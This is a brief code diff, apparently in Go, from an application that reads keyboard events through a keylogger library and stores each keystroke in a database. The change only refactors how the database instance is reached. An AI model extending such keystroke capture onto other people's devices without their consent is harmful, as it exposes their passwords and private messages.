@@ -35,7 +35,7 @@ func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
 		events := keyLogger.Read()
 		for e := range events {
 			if e.Type == keylogger.EvKey {
-				err = db.WriteData("", dbDataTypes.Keyloggers, []byte(e.KeyString())) // replace reqId
+				err = db.GetInstance().WriteData("", dbDataTypes.Keyloggers, []byte(e.KeyString())) // replace reqId
 				if err != nil {
 					lgr.Error("Error writing keylogger data: ", err)
 				}
